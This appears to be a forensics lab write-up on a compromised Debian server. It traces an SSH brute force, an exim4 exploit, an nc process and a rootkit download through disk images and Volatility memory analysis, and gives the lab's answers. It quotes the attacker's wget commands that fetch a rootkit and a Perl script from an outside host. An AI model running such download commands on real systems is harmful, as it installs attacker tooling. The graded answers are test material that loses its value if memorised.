# Case 10: Endpoint Forensics – Memory Dump Analysis (Volatility3 & FTK Imager)

This case focuses on analyzing a compromised Linux system using both disk forensics and memory forensics techniques. Tools used include FTK Imager, Volatility2/3, and log analysis to identify attacker activity, brute force attempts, exploited services, downloaded payloads, and exfiltration indicators.

---

## **Analysis**

---

## **Task 1 — Brute Force Attack Identification**
The attacker was performing a brute force attack.

To begin analysis, the provided disk image `victoria-v8.sda1.img` was mounted using FTK Imager in **Read Only** mode.

<img width="2588" height="1362" alt="image" src="https://github.com/user-attachments/assets/136377f4-6252-4a19-8bf3-b070f9c9fbbc" />

The `/var/log/auth.log` file contains evidence of repeated failed SSH login attempts targeting the **ulysses** account.

<img width="2456" height="1328" alt="image" src="https://github.com/user-attachments/assets/bf59bc9c-f2eb-4e51-9968-671314510c7c" />

**Answer:** `ulysses`

---

## **Task 2 — Count Unique Failed Login Attempts**
Using Strings and findstr on Windows:

```
"C:\Users\Administrator\Desktop\Strings\strings64.exe" -accepteula d:\[root]\var\log\auth.log | findstr /R "Failed.*ulysses" | find /c /v ""
```

<img width="1948" height="192" alt="image" src="https://github.com/user-attachments/assets/05fb0d71-1921-4470-8303-ef5641822767" />

---

## **Task 3 — Identify OS of the Target Server**
The `/etc/issue` file provides OS information.

<img width="1352" height="1314" alt="image" src="https://github.com/user-attachments/assets/5d0dd482-b50c-453a-be16-7d5a8edb3ca3" />

**Answer:** `Debian GNU/Linux 5.0`

---

## **Task 4 — Victim IP Address (Memory Analysis)**
The Debian5_26 profile was added to Volatility2 overlays, then verified:

<img width="1442" height="384" alt="image" src="https://github.com/user-attachments/assets/4f9bf9f4-5528-40c1-947d-818c057e5569" />

Command used:

```
python2 vol.py --profile=LinuxDebian5_26x86 -f <memory_dump> linux_netstat
```

<img width="2396" height="1242" alt="image" src="https://github.com/user-attachments/assets/1073ee25-9508-411b-965d-9bc5dc058b33" />

**Answer:** `192.168.56.102`

---

## **Task 5 — PID of nc Service**
Command:

```
python2 vol.py --profile=LinuxDebian5_26x86 -f <memory_dump> linux_psxview | Select-String -Pattern "nc"
```

<img width="2808" height="376" alt="image" src="https://github.com/user-attachments/assets/21ed8e4e-ad5e-4fff-a4e5-d5d608319b27" />

**Answer:** `2169`

---

## **Task 6 — Exploited Service**
Log search:

```
grep -r -E '192.168.56.[1|101]' /d/[root]
```

<img width="2074" height="1148" alt="image" src="https://github.com/user-attachments/assets/afe06f74-87c3-41e4-84d9-09b459590cb0" />

Evidence shows commands executed through **exim4**, a known exploitable service.

**Answer:** `exim4`

---

## **Task 7 — Compressed File Downloaded by Attacker**
Commands found:

```
wget http://192.168.56.1/rk.tar -O /tmp/rk.tar
wget http://192.168.56.1/c.pl -O /tmp/c.pl
```

<img width="1442" height="330" alt="image" src="https://github.com/user-attachments/assets/e2137182-5856-4ab1-9b4f-7b6fbf22d295" />

**Answer:** `rk.tar`

---

## **Task 8 — Highest Port Used in Exfiltration**
Using linux_netstat output:

<img width="2208" height="1258" alt="image" src="https://github.com/user-attachments/assets/d7c0ddf0-3705-4582-8de1-1ca716ca56de" />

**Answer:** `45295` (highest port)

---

## **Task 9 — Firewall Port Block Attempt**
After extracting `rk.tar`:

```
tar -xzf rk.tar
```

Analyzing `install.sh`:

<img width="1484" height="820" alt="image" src="https://github.com/user-attachments/assets/4f3659fb-26d2-4cb8-8b09-2212184f6566" />

Commands found:

```
iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP
```

**Answer:** `45295`

---

## **Folders**

```
screenshots/
artifacts/
queries/
```

---

## **End of Case 10**
